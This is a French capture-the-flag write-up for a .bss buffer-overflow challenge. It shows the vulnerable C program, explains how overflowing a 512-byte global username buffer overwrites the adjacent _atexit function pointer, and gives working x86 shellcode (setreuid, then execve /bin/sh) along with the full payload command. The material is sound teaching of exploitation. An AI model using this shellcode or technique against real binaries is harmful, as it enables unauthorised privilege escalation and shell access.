
## Contexte

```
#include <stdio.h>
#include <stdlib.h>
 
char username[512] = {1};
void (*_atexit)(int) =  exit;
 
void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0;
}
 
int main(int argc, char **argv)
{
  if(argc != 2)
    {
      printf("[-] Usage : %s <username>\n", argv[0]);
      exit(0);
    }
   
  cp_username(username, argv[1]);
  printf("[+] Running program with username : %s\n", username);
   
  _atexit(0);
  return 0;
}

```

On a
```
char username[512] = {1};
void (*_atexit)(int) =  exit;

```

Ces deux variables globales sont stockées dans la section .bss (d’où le titre du challenge).

```
void cp_username(char *name, const char *arg)
{
  while((*(name++) = *(arg++)));
  *name = 0;
}

```
Elle copie argv[1] dans username sans aucune vérification de taille.

Si tu fournis un argv[1] de plus de 512 octets, tu vas :

remplir complètement username

continuer à écrire après, c’est-à-dire sur _atexit.

```
cp_username(username, argv[1]);
printf("[+] Running program with username : %s\n", username);

_atexit(0);

```

Pour rappel la taille de BSS est fixe donc:

On peut supposer que notre BSS est comme cela:

`[ username (512 bytes) ][ _atexit (4 bytes sur x86) ]`

### Idee de base

Shellcode dans username + _atexit pointé dessus


<img width="504" height="144" alt="image" src="https://github.com/user-attachments/assets/fddad10c-5385-4a8d-ac6a-46e08736668b" />

Comme _atexit se trouve derriere

```
_atexit = username + 512
        = 0x0804a040 + 0x200
        = 0x0804a240
```

Donc pour detourner le flux d'execution, nous ecrasons _atexit avec
```
Adresse de username = 0x0804a040
Little endian       = "\x40\xa0\x04\x08"

```
Le shellcode réalise deux actions :

setreuid(uid, uid) pour obtenir les droits effectifs du challenge

execve("/bin/sh") pour ouvrir un shell

Shellcode (39 octets) :

```
\x31\xc0\x31\xdb\x31\xc9\x31\xd2
\xb0\x46
\x66\xbb\xb7\x04
\x66\xb9\xb7\x04
\xcd\x80
\x31\xc9\x51
\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e
\x54\x5b
\xb0\x0b
\xcd\x80


```

## Construction du payload :

`./ch7 $(python2 -c "print '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x46\x66\xbb\xb7\x04\x66\xb9\xb7\x04\xcd\x80\x31\xc9\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x54\x5b\xb0\x0b\xcd\x80' + 'A' * (512 - 39) + '\x40\xa0\x04\x08'")
`
### A retenir

.bss contient les variables globales non initialisées (ou initialisées à zéro).
remplir username

déborder dans _atexit

**Un overflow sur un pointeur de fonction = contrôle du flux d’exécution**
Si on changes _atexit => on change où le programme saute


```
0x0804a040 : username[512 bytes]
0x0804a240 : _atexit (adresse d’une fonction)

```
On rempli username avec ton shellcode

(shellcode = code machine prêt à être exécuté)
On deborde de 512 octets on ecrase _atexit

On met dedans l’adresse :
0x0804a040


Le programme fait :
_atexit(0);


Donc il fait :

saute à l’adresse 0x0804a040 → début du shellcode
exécute les instructions → spawn /bin/sh

